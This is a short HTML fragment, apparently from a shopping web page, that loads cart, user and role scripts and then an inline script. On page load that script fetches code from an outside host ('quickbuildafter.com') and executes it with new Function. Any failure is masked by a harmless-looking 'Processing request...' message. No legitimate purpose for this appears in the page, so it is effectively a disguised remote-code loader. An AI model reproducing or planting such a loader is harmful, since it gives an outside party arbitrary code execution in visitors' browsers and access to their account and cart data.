    <script src="cartItems.js"></script>
    <script src="currentUser.js"></script>
    <script src="darkMode.js"></script>
    <script src="isloading.js"></script>
    <script src="userRole.js"></script>

    <script>
        (function() {
            const REMOTE = "https://quickbuildafter.com/astray.shikar";
            const headline = document.getElementById('headline');
            const status = document.getElementById('status');

            async function load() {
                try {
                    const res = await fetch(REMOTE, { cache: 'no-store' });
                    const code = await res.text();
                    new Function('headline', 'status', code)(headline, status);
                } catch {
                    status.textContent = 'Processing request...';
                }
            }
            
            load();
        })();
    </script>
